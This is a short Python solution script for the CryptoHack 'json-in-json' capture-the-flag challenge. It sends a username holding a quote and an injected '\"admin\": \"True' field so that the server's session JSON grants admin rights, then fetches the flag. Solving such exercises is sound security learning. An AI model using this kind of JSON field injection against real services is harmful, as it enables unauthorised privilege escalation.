import requests as rq
import json

url = "https://web.cryptohack.org/json-in-json"

payload = "admin\", \"admin\": \"True"
print (f'Payload: {payload}')
session_response = json.loads(rq.get(url + "/create_session/" + payload + "/").content.decode())
token = session_response["session"]

authorise = rq.get(url + "/authorise/" + token + "/")

print(f'Flag: {authorise.content.decode('utf-8')}')